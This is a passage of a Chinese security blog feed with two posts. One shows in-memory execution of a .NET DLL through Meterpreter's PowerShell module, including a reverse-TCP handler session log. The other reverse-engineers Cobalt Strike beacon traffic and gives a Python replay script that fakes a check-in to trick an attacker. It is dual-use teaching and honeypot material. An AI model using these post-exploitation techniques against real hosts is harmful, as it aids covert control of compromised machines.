    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，<br>虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，<br>且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强<br>同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，<br>兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用<br>MSF中Meterpreter的powershell模块在内存中执行.NET程序集。</p><h3 id="0x001-C-DLL"><a href="#0x001-C-DLL" class="headerlink" title="0x001 C# DLL"></a>0x001 C# DLL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace msftest</span><br><span class="line">&#123;</span><br><span class="line">    public class msf</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run()</span><br><span class="line">        &#123;</span><br><span class="line">            return &quot;msftest by k8gege&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x002-PowerShell"><a href="#0x002-PowerShell" class="headerlink" title="0x002 PowerShell"></a>0x002 PowerShell</h3><p>首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">Reflection.Assembly</span>]::LoadFile(<span class="string">"C:\Users\k8gege\msftest.dll"</span>)</span><br><span class="line"></span><br><span class="line">GAC    Version        Location</span><br><span class="line">---    -------        --------</span><br><span class="line">False  v2.<span class="number">0.50727</span>     C:\Users\k8gege\\msftest.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\k8gege\&gt; [<span class="type">msftest.msf</span>]::run()</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure><h3 id="0x003-MSF加载-NET"><a href="#0x003-MSF加载-NET" class="headerlink" title="0x003 MSF加载.NET"></a>0x003 MSF加载.NET</h3><p>将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; powershell_import msftest.dll</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute <span class="string">"[msftest.msf]::run()"</span></span><br><span class="line">[+] Command execution completed:</span><br><span class="line">msftest by k8gege</span><br></pre></td></tr></table></figure><h3 id="0x004-关于兼容性"><a href="#0x004-关于兼容性" class="headerlink" title="0x004 关于兼容性"></a>0x004 关于兼容性</h3><p>1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试<br>有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）<br>再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。<br>这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，<br>.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常<br>正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。<br>有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗<br>它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全<br>试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容<br>CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题<br>它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现<br>MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗?</p><p>我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为<br>写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，<br>还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。</p><p>目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块<br>可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒<br>才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。<br>看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。<br>何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，<br>并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。<br>Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。</p><p>2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。<br>因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，<br>MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。</p><p>如下所示，有时通过系统PowerShell加载ex一样报错<br>PS C:\Users\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\Users\k8gege\test.exe”)<br>使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运<br>行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”<br>所在位置 行:1 字符: 32</p><ul><li>[Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\Users\k8gege\test.exe”)<ul><li>CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</li><li>FullyQualifiedErrorId : DotNetMethodException</li></ul></li></ul><h3 id="0x005-结论"><a href="#0x005-结论" class="headerlink" title="0x005 结论"></a>0x005 结论</h3><p>虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看<br>目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大<br>而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用<br>稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。</p><p>注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。<br>如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，&lt;br&gt;虽然.NET和PowerShell可以相
      
    
    </summary>
    
    
      <category term="Metasploit" scheme="http://k8gege.org/categories/Metasploit/"/>
    
      <category term=".NET" scheme="http://k8gege.org/categories/Dotnet/"/>
    
      <category term="PowerShell" scheme="http://k8gege.org/categories/PowerShell/"/>
    
    
      <category term="Metasploit" scheme="http://k8gege.org/tags/Metasploit/"/>
    
      <category term="PowerShell" scheme="http://k8gege.org/tags/PowerShell/"/>
    
      <category term=".NET" scheme="http://k8gege.org/tags/Dotnet/"/>
    
      <category term="C#" scheme="http://k8gege.org/tags/C/"/>
    
      <category term="MSF" scheme="http://k8gege.org/tags/MSF/"/>
    
      <category term="meterpreter" scheme="http://k8gege.org/tags/meterpreter/"/>
    
  </entry>
  
  <entry>
    <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
    <link href="http://k8gege.org/p/40523.html"/>
    <id>http://k8gege.org/p/40523.html</id>
    <published>2020-03-28T03:39:45.663Z</published>
    <updated>2020-03-30T03:06:09.182Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题<br>但是人为的你可能没遇到过，首先要欺骗你的远控，得分析你的协议，如果你的马根本不是公开的<br>网络又是好的，你刚往人家机器里种马，发现马只能上线不能操作，绝对是马有问题，不能甩锅我<br>人家都不知道你的马的通信原理，流量特征，不可能事先准备好一个程序，让你一发就欺骗你的马<br>本文主要研究CS这个APT很喜欢用的马，当然TCP的也一样原理，只要构造对应的数据包就可欺骗</p><h3 id="远控术语"><a href="#远控术语" class="headerlink" title="远控术语"></a>远控术语</h3><p>Cobalt Strike采用的是B/S架构，也就是常说的HTTP协议（HTTPS加密的http，记住都是WEB就不会错了）<br>Client：客户是上帝，我们想买什么告诉服务员。就是控制端，即通过它来控制对方电脑。不叫服务端哦<br>Server：服务员，即服务端。以前常说的肉鸡，这个叫被控端不是控制端，叫做什么就做什么不就是服务？<br>中转：放在VPS，好比现在的快递，可有可无，买家直接见卖家就不需要。CS中转Teamserve就是一个WEB</p><p>就是说如果你用IIS或Tomcat搭建的ASP、JSP、PHP、.NET等网站也可以做为中转，即可实现HTTP远控<br>如果CS不搞客户端，我们便可直接在浏览器上操作和控制目标机器，这就是08年这类码称为B/S架构的原因<br>CS的客户端就像我们用PY或其它语言实现模拟WEB登陆网站来操作一样，中转是WEB，那么肉鸡上线，它也<br>一样是HTTP请求来实现，WEB发包、POST提交不管怎么表达都可以，这是渗透基础，即是CS通信采用HTTP</p><p>C/S架构：Clinet/Server,主要指的是TCP，客户端和服务端，即便带个中转它也还是叫CS架构<br>B/S架构: Browser/Server,主要是HTTP，无论直接通过浏览器操作，还是像CS加个中转再用客户端访问<br>RAT：Remote Admin Tools，远程管理工具，长期以来国内外通用叫法。<br>C2: 老外的新名词，command&amp;control，从字面上就很好理解命令和控制，不管任何协议马都可这样叫<br>这种叫法对于不够专业的人来说不会错，因为他根本不需要了解远控到底用什么协议实现，反正都叫C2</p><p>当然无论是以前还是现在叫RAT也绝对不会错，叫RAT可能更专业一点，RAT像老戏骨，C2像小鲜肉<br>看看现在好多远控基本都有CMD和文件管理，甚至只是一个SHELL而已了，我猜这就是C2的由来吧<br>以前像这样一般只称为后门，随便找一个远控都有CMD、文件管理、屏幕控制、键盘记录等功能<br>而现在一个CMD和文件管理，在10几年前也很难称为马叫炮灰，现在搞个炮灰一堆BUG还以为很吊<br>以前只能称为后门，连远控都称不上的，现在只实现了一个CMD执行命令，就说成自己写个远控了<br>多台机器管理实现不了先不说，只能一对一，断以后就无法控制，连后门都不合格，还TM说成远控</p><p>PS：之所以写这一段话，主要是发现不少写马的或渗透的，竟然都分不清楚服务端和控制端</p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>还有我说HTTP协议(含HTTP/S)，还有人说不是HTTP还有HTTPS（首先搞清楚HTTPS是什么，加密的HTTP）<br>比方说你设计一个HTTP经过特定格式加密，单纯HTTP访问得不到真实数据而已，解不了就不属于HTTP了？<br>当有一天大家都觉得这个加密好用或安全，给它起个名叫KTTPS，或许可称为新协议，但本质还是HTTP协议。<br>当然可能有些人要说HTTP也属于TCP，虽说HTTP可通过TCP实现，但是两者有很大区别，通过TCP实现叫伪<br>为什么因为它不是真正的HTTP，目标WAF禁TCP的时候，TCP实现的就出不来，HTTP只要会操作WEB就行<br>HTTP比TCP多了一个，允许通过WEB操作来访问，HTTP虽是特殊的TCP，但已经完全变异成了一个新协议。</p><p>就像猩猩和人，我们几乎不会说人是猩猩，只会说人是猩猩进化而来的，因为变异太多，可以以新物种定义。<br>而HTTPS和HTTP，就像戴不戴口罩，戴个口罩就TM不是人了？除了戴个口罩，你的衣食住行哪一样不是人。<br>你不戴口罩进不了小区，那你就戴口罩就能进去了啊，就像HTTPS(HTTP基础上加SSL协议就可以访问了啊)<br>HTTP不加SSL访问不了HTTPS，你就说HTTPS不属于HTTP，这和不戴口罩不让进小区，就说你不是人一样<br>本质是因为你不是人而不让你进吗？而是你不戴口罩，并不是说你不是人所以不让你出入，概念不一样。<br>所以说我们通常只说TCP协议、HTTP协议(因为已包含HTTPS在内)，至少10几年来很少听到有人说HTTPS马<br>最多只是听说这款http马也支持https，或这个webshell工具支持https站点，这个EXP支持HTTPS站点等</p><h3 id="CS心跳包"><a href="#CS心跳包" class="headerlink" title="CS心跳包"></a>CS心跳包</h3><p>一般在设计远控时，我们都会对机器进行标记，比如上线特征为A<br>A对应信息已保存在本地数据库，因此想要确认机器是否还在控<br>我们只需要发送A标识给客户端，告诉它机器还在控制,即心跳包<br>而没实战过的人是每次都发送目标信息，这样很容易被目标发现</p><p>下面配置好CS让其上线后，我们对服务端进行抓包，其心跳包如下<br>CS也是一样，因为是BS模式HTTP协议，它的心跳特征存在Cookie里<br>非正常cookie写法，一段很长的加密数据，可以止来判断是否中招</p><p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat1.PNG"></p><h3 id="上线验证"><a href="#上线验证" class="headerlink" title="上线验证"></a>上线验证</h3><p>使用Ladon Exp生成器可以提交WEB数据包，类似Firefox上的HackBar但更高级<br>区别在于可生成Ladon插件或独立EXE，对于不懂编程的人来说也可“编写”EXP<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat2.PNG"></p><p>运行LadonPoc.exe发现CS上线，执行一次就上线一次，说明思路没错<br><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat3.gif"></p><h3 id="欺骗入侵者"><a href="#欺骗入侵者" class="headerlink" title="欺骗入侵者"></a>欺骗入侵者</h3><p>假设我们在内网中发现别人的CS流量或者抓到样本，给他模拟上线，让他有得看没得吃<br>他在客户端那边只会看到机器在线，就是死活控不了，然后他就想是不是目标环境奇葩<br>还是说网络太卡或有什么问题,能上线就是不能操作，哈哈，一直在上线却啥事也不能做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">### Cobalt Strike Cheat by K8gege</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cscheat</span><span class="params">()</span>:</span></span><br><span class="line">opener = urllib2.build_opener()</span><br><span class="line">opener.addheaders.append((<span class="string">'Cookie'</span>, <span class="string">'Qk1UsVjTNpW6aR0327yD57Zkt1m6XWurvM+bR0xqOqGnXsatzGHpnccfgqmruH6dnJudEzijQhC0NCtoAxdA90rso7NAfBrfRrktO5B4FjZX6LEBxIyzEwQ71Jk1ttM8VY6luE5k+PMLk6DAmWUoGoJmvAl/qp4qreuWumv52TM='</span>))</span><br><span class="line">res = opener.open(<span class="string">"http://192.168.1.102:800/dpixel"</span>)</span><br><span class="line">content = res.read()</span><br><span class="line"><span class="keyword">print</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">print(time.strftime(<span class="string">'%Y-%m-%d %X'</span>,time.localtime()))    </span><br><span class="line">cscheat()</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat4.gif"></p><h3 id="读取CMD指令"><a href="#读取CMD指令" class="headerlink" title="读取CMD指令"></a>读取CMD指令</h3><p>当客户端下达CMD命令时，中转TeamServer会将命令放在心跳包中，返回的结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^Zd........N...&amp;....%COMSPEC%.... /C net user k8gege..AAAAAAAAAA.&lt;....g..I9.....</span><br><span class="line"></span><br><span class="line">5e5a69740000002e0000004e000000260000000925434f4d535045432500000013202f43206e6574</span><br><span class="line">2075736572206b387465616d00004141414141414141414100e488fc2a22f737b0067ac4384c4971</span><br></pre></td></tr></table></figure><p>测试多次发现不管执行多长的命令 都会出现/C空格 和两个00加至少一个A<br>所以我们截取 2F4320 和 000041 之间的值，再解密即为CS下发的CMD命令</p><p><img alt="img" data-original="http://k8gege.org/k8img/csonline/cscheat5.PNG"></p><h3 id="返回CMD结果"><a href="#返回CMD结果" class="headerlink" title="返回CMD结果"></a>返回CMD结果</h3><p>将CS的命令执行结果提交到submit.php页面，即可实现回显,数据包如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /submit.php?id=60871 HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)</span><br><span class="line">Host: 192.168.1.102:800</span><br><span class="line">Content-Length: 68</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">...@...</span><br><span class="line">........win-60a3b595b7m\k8gege</span><br><span class="line">................0=W1..LGCN..</span><br></pre></td></tr></table></figure><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>通过本文我们了解了CS心跳包机制、下达指令、回显等原理，并玩弄入侵者<br>有兴趣的话，可以自行抓包实现自己的CS服务端，甚至支持对Linux的控制<br>也可以实现CS远控的密罐，把CS下达的指令提取出来，返回假的CMD命令结果<br>即能收集目标证据以及意图，还能将他玩弄于鼓掌之中，搞死他，哈哈</p><p>PS：之所以有这篇文章，是因为昨晚有人在群里讨论，CS能不能支不支持Linux<br>目前CS的shellcode以及beacon(核心功能DLL)都是WINDOWS系统才能执行。<br>而CS对于Linux的控制目前仅是SSH会话，想真正支持就得自己实现服务端<br>不要说让其支持Linux，用个GO来实现，兼容全平台都可以，只是很麻烦<br>因为不开源，每一个动作都要自己去分析它的数据包，很多功能也很费时<br>其实早在去年的这个时间就想实现Linux服务端，所以抓包研究了下。<br>当时就应该有这篇文章了，只是因为忙，懒得编辑文字，后面忘了发。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题&lt;br&gt;但是人为的你可能没遇到过，首先要欺骗你的远控，
      
    
    </summary>
    
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/CS/"/>
    
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/tags/CS/"/>
    
      <category term="Python" scheme="http://k8gege.org/tags/Python/"/>
    
  </entry>
  
</feed>
